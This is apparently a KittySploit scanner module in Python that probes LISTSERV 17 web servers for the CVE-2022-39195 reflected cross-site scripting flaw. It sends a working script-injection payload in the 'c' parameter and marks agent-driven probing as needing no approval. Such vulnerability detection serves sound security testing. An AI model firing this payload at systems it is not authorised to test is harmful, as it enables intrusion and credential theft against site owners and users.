#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LISTSERV 17 web interface contains a cross-site scripting vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'LISTSERV 17 - Cross-Site Scripting Detection',
        'description': 'LISTSERV 17 web interface contains a cross-site scripting vulnerability. An attacker can inject arbitrary JavaScript or HTML via the "c" parameter, thereby possibly allowing the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'xss', 'listserv', 'packetstorm', 'lsoft', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/170552/LISTSERV-17-Cross-Site-Scripting.html',
            'https://peach.ease.lsoft.com/scripts/wa-PEACH.exe?A0=LSTSRV-L',
            'https://packetstormsecurity.com/2301-exploits/listserv17-xss.txt',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-39195',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2022-39195',
    }

    def run(self):
        for path in ('/scripts/wa.exe?TICKET=test&c=%3Cscript%3Ealert(document.domain)%3C/script%3E', '/scripts/wa-HAP.exe?TICKET=test&c=%3Cscript%3Ealert(document.domain)%3C/script%3E'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = (r.text or "").lower()
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items()).lower()
            body_all = ('<script>alert(document.domain)</script>', 'listserv',)
            header_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="LISTSERV 17 - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

